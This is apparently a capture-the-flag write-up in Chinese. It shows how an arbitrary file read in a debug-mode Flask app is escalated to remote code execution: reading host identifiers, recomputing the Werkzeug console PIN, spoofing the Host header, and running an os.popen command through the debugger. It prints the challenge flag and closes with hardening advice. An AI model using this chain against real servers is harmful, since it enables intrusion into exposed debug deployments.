# My Flask App

## 题目简述

Flask 应用以 `debug=True` 运行，并暴露任意文件读取：

```python
@app.get("/view")
def view():
    filename = request.args.get("filename")
    with open(filename, "r") as f:
        return f.read()
```

Werkzeug 调试控制台需要 PIN，但 PIN 由若干可公开或可通过文件读取获得的主机信息确定。结合伪造 `Host: 127.0.0.1`，可以完成控制台认证并执行任意 Python。

## 解题过程

### 1. 读取 PIN 的私有材料

官方脚本通过 `/view` 读取：

```text
/sys/class/net/eth0/address
/proc/sys/kernel/random/boot_id
```

MAC 地址去掉冒号后转为十进制整数。镜像为 `python:3.11-slim`，应用以 `nobody` 运行，因此 PIN 的“公开材料”可确定为：

```python
probably_public_bits = [
    "nobody",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.11/site-packages/flask/app.py",
]
```

私有材料为：

```python
private_bits = [decimal_mac, boot_id]
```

### 2. 复现 Werkzeug PIN 算法

按题目所用 Werkzeug 版本，以 SHA-1 依次吸收非空材料，再加入：

```text
cookiesalt
```

生成调试 Cookie 名；继续加入：

```text
pinsalt
```

把摘要转为十进制并取前 9 位，再按可整除的 5、4、3 位分组插入连字符：

```python
num = ("%09d" % int(h.hexdigest(), 16))[:9]
```

这必须与远端 Flask/Werkzeug 版本一致，不能套用旧版 MD5 算法。

### 3. 绕过控制台主机限制

公网域名直接访问 `/console` 会受调试器 trusted-host 检查。HTTP `Host` 头却由客户端控制，官方解法使用：

```python
headers = {"Host": "127.0.0.1"}
```

让 Werkzeug 把请求视作本地主机。控制台 HTML 中会包含本次进程生成的 `SECRET`，用正则提取：

```text
SECRET = "..."
```

### 4. PIN 认证与命令执行

向控制台发送：

```text
?__debugger__=yes&cmd=pinauth&pin=<PIN>&s=<SECRET>
```

保存响应中的调试 Cookie。随后带 Cookie 请求：

```text
?__debugger__=yes
&cmd=__import__('os').popen('cat /flag*').read()
&frm=0
&s=<SECRET>
```

表达式在调试控制台帧 0 中执行，响应即包含 flag。

仓库正式挑战镜像中的 flag 为：

```text
SEKAI{1s_th15_3ven_c4ll3d_4_cv3}
```

## 方法总结

任意文件读在 debug Flask 中通常可以直接升级为 RCE，因为 Werkzeug PIN 不是服务器秘密，只是若干环境标识的确定性派生值。`Host` 头参与“是否本地”的判断又提供了第二个绕过点。

生产环境绝不能启用 Flask debugger。若必须临时调试，应只绑定隔离回环接口，并在外层反向代理拒绝 `/console`、规范化 Host；同时修复任意路径读取，使用固定根目录与 canonical path 校验。
